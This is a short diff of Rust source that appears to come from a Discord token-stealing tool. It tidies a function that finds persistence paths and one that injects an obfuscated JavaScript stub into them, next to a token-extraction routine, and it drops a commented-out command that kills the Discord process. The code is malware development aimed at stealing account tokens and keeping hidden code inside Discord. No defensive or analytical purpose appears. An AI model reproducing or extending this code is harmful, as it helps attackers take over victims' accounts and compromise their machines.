@@ -86,8 +86,6 @@ fn get_persistence_paths() -> Vec<PathBuf> {
             }
         }
     }
-
-    println!("{:?}", paths);
     paths
 }
 
@@ -104,15 +102,6 @@ pub fn get_token_from_file(token_regex: &Regex, file: &PathBuf) -> Option<String
 
 pub fn inject_persistence() {
     let to_dump: String = include!("../stub_obf.js").to_string();
-
-    //end discord process
-    //taskkill /f /im discord.exe
-    /*let mut child = Command::new("cmd.exe")
-        .arg("/C TASKKILL /F /IM discord.exe")
-        .spawn()
-        .expect("failed to execute child");
-
-    child.wait().expect("failed to kill discord");*/
 
     let persistence_paths = get_persistence_paths();
     for persist_loc in persistence_paths {
